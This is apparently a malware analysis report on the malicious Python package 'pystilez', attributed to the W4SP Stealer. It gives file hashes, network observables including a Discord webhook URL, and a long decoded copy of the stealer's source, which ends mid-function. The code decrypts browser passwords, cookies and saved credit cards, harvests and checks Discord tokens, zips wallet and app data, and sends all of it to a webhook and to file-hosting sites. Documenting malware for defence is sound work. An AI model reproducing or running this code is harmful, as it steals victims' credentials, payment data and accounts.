PYTHON MALWARE

MALWARE ATTRIBUTION: W4SP STEALER

PACKAGE NAME: pystilez
VERSION: 3.9

INFECTED FILE: pystilez-3.9/pystilez/__init__.py


INFECTED CODE:
LINE: 4 - 6859
code=b'''__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r__0x_1ucif3r = "".....

PYTHON FILE HASH:
MD5: A931DB46F97162FBCA174AD04031EB93
SHA1: 66E41D45D709374B7D844656BB7DD5BADBDE72DB
SHA256: 80118467A85C13B83845CDAFF8390626E825B74BF1851651645B0F50E5B92B81


OBSERVABLES:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
URL: https://api.ipify.org
URL: https://geolocation-db.com/jsonp/{IP}
URL: https://api.gofile.io/getServer
URL: https://api.anonfiles.com/upload
URL: https://transfer.sh/
DISCORD WEBHOOK: https://discord.com/api/webhooks/1052767605989056562/7p9oTa7QdN-G6rLxy6ZBO_qwd-gnSu8JQBpbV7NoEW1vDsQQQYPmof_hh_LCWe_97Xq9


Decoded:
import os
import re
import time
import shutil
import random
import threading
import requests
import subprocess
from sys import executable
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
requirements = [
    ["Crypto.Cipher", "pycryptodome"],
    ["requests", "requests"],
]
for modl in requirements:
    try: 
        __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES
# W4SP V2
# by lotus#0001 and xKian#3113


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def getip():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def zipfolder(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED) # https://stackoverflow.com/questions/10480440/zip-folder-with-subfolder-in-python
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def LoadUrlib(hook, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
            else:
                r = urlopen(Request(hook, data=data))
            return r
        except: 
            pass

def globalInfo():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f":rainbow_flag:  - `{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f":rainbow_flag:  - `{username.upper()}`"

def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def getCodes(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())
        for code in codess:
            try:codes += f":tickets: **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass
        return codes
    except:return ""

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends`"

def GetUHQGuilds(token):
    try:
        uhqguilds = ""
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 50: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:I_Join:928302098284691526> [{guild['name']}]({cc}) `({guild['id']})` **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == "": return "`No HQ Guilds`"
        return uhqguilds
    except:
        return "`No HQ Guilds`"

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "-"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def Trim(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = Trim(GetUHQFriends(token))
    guilds = Trim(GetUHQGuilds(token))
    codes = Trim(getCodes(token))

    if codes == "": codes = "`No Codes`"
    if billing == "": billing = ":lock:"
    if badge == "" and nitro == "": badge, nitro = ":lock:", ""
    if phone == "": phone = "-"
    if friends == "": friends = ":lock:"
    if guilds == "": guilds = ":lock:"
    path = path.replace("\\", "/")

    data = {
        "content": f'{GLINFO}\n\n**Found in** `{path}`',
        "embeds": [
            {
            "color": 7419530,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`"
                },
                {
                    "name": "<:T_Gmail:926969501159915521> Gmail:" if "@gmail.com" in email else ":e_mail: Mail:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"`{phone}`",
                    "inline": True
                },
                {
                    "name": "<:I_Earth:907674190470074429> IP:",
                    "value": f"`{IP}`",
                    "inline": True
                },
                {
                    "name": "<:Crown:930906710019833856> Badges:",
                    "value": nitro + badge,
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": billing,
                    "inline": True
                },
                {
                    "name": "<:wumpusWave:943553592063852594> HQ Friends:",
                    "value": friends,
                    "inline": False
                },
                {
                    "name": "<:I_Compass:923312623179661322> HQ Guilds:",
                    "value": guilds,
                    "inline": False
                },
                {
                    "name": ":gift: Gift codes:",
                    "value": codes,
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@MIKU"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "attachments": []
        }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if "NationsGlory" in name:
        data = {
            "content": None,
            "embeds": [
                {
                "title": f"W4SP | {name.split(';')[0]}",
                "color": 15781403,
                "fields": link,
                "footer": {
                    "text": "@MIKU",
                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                },
                "thumbnail": {
                    "url": name.split(';')[1]
                }
                }
            ],
            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content": GLINFO,
            "embeds": [
                {
                "color": 7419530,
                "fields": endlist,
                "author": {
                    "name": "FILE"
                },
                "footer": {
                    "text": "@MIKU"
                }
                }
            ],
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens += token
                                uploadToken(token, path)


def getPassw(path, arg):
    try:
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in paswWords: paswWords.append(old)
                Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
                PasswCount += 1
        writeforfile(Passw, 'passwords')
    except:pass
def getCookie(path, arg):
    try:
        global Cookies, CookiCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies ")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"{row[0]}\tTRUE\t/\tFALSE\t1708726694\t{row[1]}\t{DecryptValue(row[2], master_key)}\n")
                CookiCount += 1
        writeforfile(Cookies, 'cookies')
    except:pass
def getCCs(path, arg):
    try:
        global CCs, CCsCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM credit_cards ")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {DecryptValue(row[4], master_key)} | EXPIRY: {row[2]}/{row[3]}")
                CCsCount += 1
        writeforfile(CCs, 'ccs')
    except:pass
def getAutofill(path, arg):
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        for row in data:
            if row[0] != '':
                Autofill.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AutofillCount += 1
        writeforfile(Autofill, 'autofill')
    except:pass
def getHistory(path, arg):
    try:
        global History, HistoryCount
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM urls")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)
        for row in data:
            if row[0] != '':
                History.append(row[1])
                HistoryCount += 1
        writeforfile(History, 'history')
    except:pass
def getwebsites(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = Reformat(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def getBookmarks(path, arg):
    try:
        global Bookmarks, BookmarksCount
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = json_loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        Bookmarks.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        BookmarksCount += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        writeforfile(Bookmarks, 'bookmarks')
    except:pass
def parseCookies():
        tmpCookies = []
        for cookie in Cookies:
            try:
                key =   cookie.split(' | ')[0].split(': ')[1]
                name =  cookie.split(' | ')[1].split(': ')[1]
                value = cookie.split(' | ')[2].split(': ')[1]
                tmpCookies.append(f"{key}\tTRUE\t/\tFALSE\t{str(int(time.time())+3600)}\t{name}\t{value}")
            except: pass
        writeforfile(tmpCookies, 'parsedcookies')

def startBthread(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def getBrowsers(browserPaths):
    global Browserthread
    ThCokk, Browserthread, filess = [], [], []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        startBthread(getAutofill,   [patt[0], patt[3]])
        startBthread(getHistory,    [patt[0], patt[3]])
        startBthread(getBookmarks,  [patt[0], patt[3]])
        startBthread(getCCs,        [patt[0], patt[3]])
        startBthread(getPassw,  [patt[0], patt[3]])

    for thread in ThCokk: thread.join()
    if Trust(Cookies) == True: __import__('sys').exit(0)
    for thread in Browserthread: thread.join()
    senhas = ""
    wpcookies = ""
    wpccs = ""
    wpautofill = ""
    wphistory = ""
    wpparsedcookies = ""
    wpbookmarks = ""
    for file in os.listdir(os.getenv("TEMP")):
        if 'wppasswords' in file:
            senhas = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wpcookies' in file:
            wpcookies = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wpccs' in file:
            wpccs = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wpautofill' in file:
            wpautofill = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wphistory' in file:
            wphistory = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wpparsedcookies' in file:
            wpparsedcookies = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        if 'wpbookmarks' in file:
            wpbookmarks = uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": "PASSWORD",
                "description": f"**Found**:\n{getwebsites(paswWords)}\n\n**Data:**\n:key: **{PasswCount}** Passwords Found\n:link: [Passwords.txt]({senhas})",
                "color": 7419530,
                "footer": {"text": "@MIKU"}
            },
            {
                "title": "COOKIES",
                "description": f"**Found**:\n{getwebsites(cookiWords)}\n\n**Data:**\n:cookie: **{CookiCount}** Cookies Found\n:link: [Cookies.txt]({wpcookies})\n:link: [Parsed.txt]({wpparsedcookies})",
                "color": 7419530,
                "footer": {"text": "@MIKU"}
            },
            {
                "title": "OTHER",
                "description": f":newspaper: **{HistoryCount}** Websites Found\n:link: [history.txt]({wphistory})\n\n:shield: **{AutofillCount}** Infos Found\n:link: [autofill.txt]({wpautofill})\n\n:blue_book: **{BookmarksCount}** Bookmarks found\n:link: [bookmarks.txt]({wpbookmarks})\n\n:credit_card: **{CCsCount}** Ccs Found\n:link: [ccs.txt]({wpccs})",
                "color": 7419530,
                "footer": {"text": "@MIKU"}
            }
        ],
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    return


def GetDiscord(path, arg):

    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    #print(line)
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                #print(token)
                                Tokens += tokenDecoded
                                # writeforfile(Tokens, 'tokens')
                                uploadToken(tokenDecoded, path)
 
def ngstealer(path):
    path = f"{path}\\000003.log"
    if not os.path.exists(path): return
    users = []
    f = open(path, "r+", encoding="ansi")
    accounts = re.findall(r'{"username":".{1,69}","token":"', str(f.readlines()))
    # accounts2 = [x.replace('{"username":"', '') for x in accounts]
    for uss in accounts:
        username = uss.split('{"username":"')[1].split('"')[0]
        if username not in users:
            users += [username]
    
    servers = ["Blue","Orange","Yellow","White","Black","Cyan","Lime","Coral","Pink","Alpha","Sigma","Gamma","Omega","Purple","Green","Red","Delta","Ruby"]

    for user in users:

        payname = f"NationsGloy | {user};https://skins.nationsglory.fr/face/{user}/16"
        payload = []

        url = f"https://nationsglory.fr/profile/{user}"
        # url = f"https://nationsglory.fr/profile/Zer0Tw0"
        html = urlopen(url).read()

        for server in servers:
            serv = server.split("| ")[1].lower()
            
            data = html.split(f'data-server="{serv}">')[1].split('<div class="card server-tab d-none"')[0]
            # print(data)
            # exit()
            if not "pas encore conne" in data:
                
                try:

                    timeplayed = data.replace("\n", '').split('>Temps de jeu</h4><p class="h3 mb-2">')[1].split("</p>")[0].replace("\\", "").replace("n", '')
                    # if "h" in timeplayed:
                    contry = data.replace("\n", '').split('><a href="/country/lime/')[1].split('">')[0]
                    contryrank = data.replace("\n", '').split('Rang de pays</h4><p class="h3 mb-2">')[1].split('</p></div><div class="c')[0]
                except:
                    contry, contryrank = "Pas de pays","Pas de rank"
                
                if "h" in timeplayed:
                    
                    payload += [{"name": server,"value": f"PlayTime: {timeplayed}\nContry: {contry}\nRank: {contryrank}","inline": True}]
        
        upload(payname, payload)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for walletids in wallts:
        
        for patt in paths1:
            a = threading.Thread(target=ZipThings, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin: Wallets\n"
        for i in WalletsZip:
            wal += f"[{i[0]}]({i[1]})\n"
    if not len(GamingZip) == 0:
        ga = ":video_game: Gaming:\n"
        for i in GamingZip:
            ga += f"[{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets: Apps\n"
        for i in OtherZip:
            ot += f"[{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": GLINFO,
        "embeds": [
            {
            "title": "DATA",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 7419530,
            "footer": {
                "text": "@MIKU"
            }
            }
        ],
        "attachments": []
    }
